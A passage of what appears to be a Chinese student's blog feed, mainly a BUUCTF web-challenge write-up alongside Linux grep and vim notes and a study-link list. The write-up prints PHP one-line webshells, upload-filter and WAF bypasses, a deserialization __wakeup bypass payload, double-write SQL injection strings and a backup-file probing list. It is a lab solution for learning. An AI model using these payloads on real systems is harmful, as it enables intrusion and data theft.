test1.txt </span>teacher zhaoTeacher wangstudent liStudent qinteach himsovle itroot@VM-16-11-debian:/tmp/test<span class="token comment"># grep teacher test1.txt </span>teacher zhaoroot@VM-16-11-debian:/tmp/test<span class="token comment"># grep t test1.txt </span>teacher zhaostudent liStudent qinteach himsovle it<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>-v</code>参数：进行反向搜索（输出不匹配该模式的行） 。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -v t test1.txt </span>Teacher wang<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  <code>-n</code>参数：显示匹配模式的行所在的行号 。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -n t test1.txt </span><span class="token number">1</span>:teacher zhao<span class="token number">3</span>:student li<span class="token number">4</span>:Student qin<span class="token number">5</span>:teach him<span class="token number">6</span>:sovle it<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>-c</code>参数：显示多少行含有匹配的模式 。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -c t test1.txt </span><span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <code>-e  </code>参数：指定多个匹配模式 。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -e t -e a test1.txt </span>teacher zhaoTeacher wangstudent liStudent qinteach himsovle it<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通用的可以使用通配符、正则表达式来匹配~</p><hr><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux4/202201221842398.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASC学习</title>
      <link href="/posts/myh10009.html"/>
      <url>/posts/myh10009.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="一、MPI"><a href="#一、MPI" class="headerlink" title="一、MPI"></a>一、MPI</h2><p>本次学习基于：<a href="https://mpitutorial.com/tutorials/">https://mpitutorial.com/tutorials/</a> ，MPI教程。</p><p><a href="https://zhuanlan.zhihu.com/p/355652501">https://zhuanlan.zhihu.com/p/355652501</a></p><h2 id="二、make学习"><a href="#二、make学习" class="headerlink" title="二、make学习"></a>二、make学习</h2><p><a href="https://www.ruanyifeng.com/blog/2015/02/make.html">https://www.ruanyifeng.com/blog/2015/02/make.html</a></p><h2 id="三、cmake学习"><a href="#三、cmake学习" class="headerlink" title="三、cmake学习"></a>三、cmake学习</h2><p><a href="https://www.hahack.com/codes/cmake/">https://www.hahack.com/codes/cmake/</a></p><h2 id="四、机器学习"><a href="#四、机器学习" class="headerlink" title="四、机器学习"></a>四、机器学习</h2><p>视频：<a href="https://www.bilibili.com/video/BV164411b7dx?from=search&amp;seid=13050048519173094800&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV164411b7dx?from=search&amp;seid=13050048519173094800&amp;spm_id_from=333.337.0.0</a></p><p>​           <a href="https://www.coursera.org/learn/machine-learning/home/welcome">https://www.coursera.org/learn/machine-learning/home/welcome</a></p><p>笔记：<a href="http://www.ai-start.com/ml2014/">http://www.ai-start.com/ml2014/</a></p><h2 id="五、Pytorch学习"><a href="#五、Pytorch学习" class="headerlink" title="五、Pytorch学习"></a>五、Pytorch学习</h2><p>wiki：<a href="https://handbook.pytorch.wiki/">https://handbook.pytorch.wiki/</a></p><hr><p>动态学习，一点一点补~</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/ASC/202201221837341.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> ASC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MPI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf练习[11-20]</title>
      <link href="/posts/myh10008.html"/>
      <url>/posts/myh10008.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="11-极客大挑战-2019-Knife"><a href="#11-极客大挑战-2019-Knife" class="headerlink" title="11.[极客大挑战 2019]Knife"></a>11.[极客大挑战 2019]Knife</h2><p>题目都告诉了是白给的shell，直接连就好了拿到webshell，找到根目录下有个flag，读取拿到flag:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659622.png"></p><h2 id="12-极客大挑战-2019-Http"><a href="#12-极客大挑战-2019-Http" class="headerlink" title="12.[极客大挑战 2019]Http"></a>12.[极客大挑战 2019]Http</h2><p>考察的主要是http头部的一些信息，按着改就行了。首先那道题进入网页看到源码里面隐藏一个：<code>Secret.php</code>，进入后看到提示信息：</p><p>It doesn’t come from ‘<a href="https://sycsecret.buuoj.cn&amp;/#39;%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8A%93%E5%8C%85%E6%94%B9%EF%BC%9A">https://Sycsecret.buuoj.cn'，直接抓包改：</a></p><ul><li>加个<code>Referer</code>: <a href="https://sycsecret.buuoj.cn,/">https://Sycsecret.buuoj.cn，</a></li></ul><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659623.png"></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659625.png"></p><ul><li>看到又说必须使用”syclover browser”,接着改<code>User-Agent</code></li></ul><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659626.png" style="zoom:150%;"><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659627.png" style="zoom:150%;"><ul><li>这又说必须本地访问，再改<code>X-Forwarded-For</code>拿到flag:</li></ul><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659628.png"></p><p>这里讲一下这三个参数：</p><ul><li><code>Referer</code>: 浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL(你从哪来的)。</li><li><code>User-Agent</code>: 浏览器表明自己的身份（是哪种浏览器）。 </li><li><code>X-Forwarded-For</code>: 表示 HTTP 请求端真实 IP。</li></ul><h2 id="13-极客大挑战-2019-Upload"><a href="#13-极客大挑战-2019-Upload" class="headerlink" title="13.[极客大挑战 2019]Upload"></a>13.[极客大挑战 2019]Upload</h2><p>好久没做文件上传的题了，有点难到我了。</p><p>首先上传一个一句话木马试试：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示：NOT IMAGE，那就抓包先改COntent-Type:<code>image/jpeg</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146199.png"></p><p>接着说不能是php，绕过后缀的有文件格式有php,php3,php4,php5,phtml，phtm，前几个试试都不行，那就试试phtml：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146202.png"></p><p>接着是不能含有’&lt;?’ ，那就再改，查到了一个payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token double-quoted-string string">"php"</span><span class="token operator">&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>shell<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146204.png"></p><p>接着说不是图片，那就是检查了头部信息，加特征信息，成功上传：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">?</span> <span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token double-quoted-string string">"php"</span><span class="token operator">&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146205.png"></p><p>最后在连的时候要猜一下文件上传到哪里了！<strong>常规的目录/upload下面</strong>，然后直接连  /upload/2.phtml  就可以了</p><p>蚁剑连一下flag就在根目录，拿到flag:flag{07b9cce3-4089-4384-a26a-4572c9c90566}。</p><p>总体思路大概就是先上传个马，看返回信息，然后对应改就可以了，还有很多过滤，以后慢慢遇见~</p><p>这里推荐一篇博客，讲解了一句话木马的原理：<a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a></p><h2 id="14-ACTF2020-新生赛-Upload"><a href="#14-ACTF2020-新生赛-Upload" class="headerlink" title="14.[ACTF2020 新生赛]Upload"></a>14.[ACTF2020 新生赛]Upload</h2><p>这题和上题差不多，多了一个<strong>前端验证</strong>，所以可以先制作一个图片木马上传抓包，然后改文件后缀为：phtml，成功上传，然后就可以直接连了拿到webshell：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201639371.png"></p><p>拿到flag：flag{7facc008-0a13-457f-9a24-3f63516cd0c8}</p><h2 id="15-RoarCTF-2019-Easy-Calc"><a href="#15-RoarCTF-2019-Easy-Calc" class="headerlink" title="15.[RoarCTF 2019]Easy Calc"></a>15.[RoarCTF 2019]Easy Calc</h2><p>这题难道我了，首先题目考察的是命令执行。但是设置了WAF和一些字符过滤，里面涉及了挺多不知道的知识点。首先访问页面是一个输入框，看页面源码看到提示设置了WAF来阻止你的一些输入，还可以看到一个calc.php，看到里面也有一些匹配限制。注意一下，这个WAF不仅仅是这个php还有你看不到的，就比如先输入calc.php?num=a，可以看到返回403，因为这里过滤了字母你只能是数字。所以这里运用到了<code>php字符串解析特性</code>：</p><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><pre class="line-numbers language-none"><code class="language-none">/news.php?%20news[id%00=42"+AND+1=0--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在解析查询字符串时，它会做两件事：</p><blockquote><p>​    1.删除空白符</p><p>​    2.将某些字符转换为下划线（包括空格）</p></blockquote><p>具体可以参考这篇文章：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p><p>所以接下来我们可以构造payload: /calc.php? num=a，可以发现此时页面能够回显ａ，这里在num前面加了空格，WAF检测的是num，但是我们输入的是‘　num’，所以就绕过了WAF，但是PHP在解析的时候会删除空白字符，就会存储为Array([num] =&gt; “ａ”)，同时实现了给num赋非数字值。这样就过了第一关。</p><p>下一个是绕过正则匹配了，有两种方法：</p><ol><li>使用chr()绕过，将ascii码转成单个字符串在用<code>.</code>拼接。</li><li>使用字符取反绕过，如<code>~%9e</code>就代表字符串<code>a</code>。</li></ol><pre class="line-numbers language-none"><code class="language-none">这里/=chr(47)?%20num=var_dump(scandir(chr(47)))　　// 列出根目录下的全部文件名 ?%20num=var_dump(file_get_contents(~%D0%99%CE%9E%98%98))　// 读flag文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里的取反就是将二进制0变为1，1变为0，具体实现就如：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409604.png"></p><p>所以我们在读的时候<font color="#FF5E3A" size="3">再取反一次</font>就是等价于读f1agg。</p><p>还有一些绕过技巧见：<a href="https://www.hetianlab.com/specialized/20201124173456">https://www.hetianlab.com/specialized/20201124173456</a></p><p>这里还有另外一种方法HTTP走私，具体可见：</p><p><a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p><p><a href="https://baijiahao.baidu.com/s?id=1715478145881946407&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1715478145881946407&amp;wfr=spider&amp;for=pc</a></p><h2 id="16-极客大挑战-2019-PHP"><a href="#16-极客大挑战-2019-PHP" class="headerlink" title="16.[极客大挑战 2019]PHP"></a>16.[极客大挑战 2019]PHP</h2><p>打开题目是可爱的猫猫，先逗会猫在做题哈哈……题目提示有文件备份，那就直接开扫，遇见别用了好拉扫不到，用dirsearch扫到<a href="http://www.zip，直接访问下载到源码，看到flag.php，哦~假的:狗头:，那就分析源码：">www.zip，直接访问下载到源码，看到flag.php，哦~假的:狗头:，那就分析源码：</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token single-quoted-string string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意看到index.php里有参数传入，并且有反序列化，再看class.php:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总的读下来要想拿到flag，就得让password=100,username=admin,可以看到直接反序列化肯定不行，这里有__wakeup函数，所以要绕过，绕过技巧就是让序列化后的属性值大于原本的属性值个数，具体构造代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"100"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">':2:'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">':3:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//绕过__wakeup</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接传参得到 flag{bf2e4c0e-baf2-4f7f-81a1-0c4857a3366c}</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409606.png" alt="可爱猫猫"></p><h2 id="17-极客大挑战-2019-BabySQL"><a href="#17-极客大挑战-2019-BabySQL" class="headerlink" title="17.[极客大挑战 2019]BabySQL"></a>17.[极客大挑战 2019]BabySQL</h2><p>这个SQL注入相比较之前的就是多了过滤设置，而且这里主要考察的<strong>双写绕过</strong>，其中做题容易忽略的一点就是前面过滤的后面给忘了hh:</p><p>1.判断注入点，再密码位置输入<code>1'</code>，发现报错，说明存在SQL注入。</p><p>2.接着判断字段数，使用<code>order by 8 # </code>，发现报错：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409607.png"></p><p>看到<code>or</code>和<code>by</code>没了，说明被过滤了，拿过滤什么就双写什么改为：<code>oorrder bbyy 4 #</code>，接着改为3就对了说明是三段。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409608.png"></p><p>3.看回显哪部分: <code>union select 1,2,3</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409609.png"></p><p>看到<code>union,select</code>也被过滤了，再改：<code>1' ununionion selselectect 1,2,3 # </code>:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409610.png"></p><p>4.接下来就是正常步骤了，查库名：<code>1' ununionion seselectlect 1,database(),3 #</code>得到使用的是<code>geek</code>，那就先接着查</p><p>5.查表名<code>1' ununionion seselectlect 1,(seselectlect group_concat(table_name) from information_schema.tables where table_schema='geek'),3 #</code>,最坑的来了：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409611.png"></p><p>发现<code>where</code>和<code>.tables</code>前面的没了，这里记得<code>information</code>里面有<code>or</code>!!!，给过滤了，同时之后看到from也给过滤了，所以修改之后为：</p><p><code>1' ununionion seselectlect 1,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'),3 #</code>，就得到表名了，之后就没啥新的过滤了，最后得到flag。</p><h2 id="18-ACTF2020-新生赛-BackupFile"><a href="#18-ACTF2020-新生赛-BackupFile" class="headerlink" title="18.[ACTF2020 新生赛]BackupFile"></a>18.[ACTF2020 新生赛]BackupFile</h2><p>这题考查的主要是<strong>源码泄露</strong>以及<strong>弱类型比较</strong>。</p><p>网站备份压缩文件：管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。常见的备份文件后缀：</p><pre class="line-numbers language-none"><code class="language-none">.index.php.swpindex.php.swpindex.php.bak  //本题提示的bak备份文件.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下来之后就可以得到一个index.php.bak备份文件，看到源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以知道是弱类型比较：对数据的类型要求并不严格，可以让数据类型互相转换。</p><p><strong>“==”类型转换的规则</strong>：</p><p>1、字符串和数字比较，<font color="#FF5E3A" size="3">字符串会自动被转换成数字</font>。</p><p>​        “admin”==0(true)：admin被转换成数字，由于admin是字符串，转换失败，int（admin）=0，所以比较结果是true。</p><p>2、混合字符串转换成数字，看字符串的第一个。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">“<span class="token number">1</span>admin” <span class="token operator">==</span> <span class="token number">1</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>类似的还有MD5弱类型比较等。所以payload就为：<code>index.php?key=123</code>，得到flag{0951de20-f469-458f-8e3b-ffc4d519580a}</p><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659121.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第三章</title>
      <link href="/posts/myh10007.html"/>
      <url>/posts/myh10007.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第三章：使用编辑器"><a href="#第三章：使用编辑器" class="headerlink" title="第三章：使用编辑器"></a>第三章：使用编辑器</h2><h3 id="3-1-检查vim软件包，安装vim"><a href="#3-1-检查vim软件包，安装vim" class="headerlink" title="3.1 检查vim软件包，安装vim"></a>3.1 检查<code>vim</code>软件包，安装<code>vim</code></h3><p>有的发行版默认的<code>vim</code>编辑器并不是完整的包，只是<code>vim.tiny  </code>，提供少量的编辑功能。所以首先检查一下包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">which</span> <span class="token function">vi</span>/usr/bin/vi$ readlink -f /usr/bin/vi    <span class="token comment">#readlink –f命令能够立刻找出链接文件的最后一环。</span>/usr/bin/vim.tiny<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时就要安装<code>vim</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">vim</span>$ readlink -f /usr/bin/vi/usr/bin/vim.basic    <span class="token comment">#安装成功了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-vim基础"><a href="#3-2-vim基础" class="headerlink" title="3.2 vim基础"></a>3.2 vim基础</h3><p>启动<code>vim</code>编辑器:</p><pre class="line-numbers language-bash" 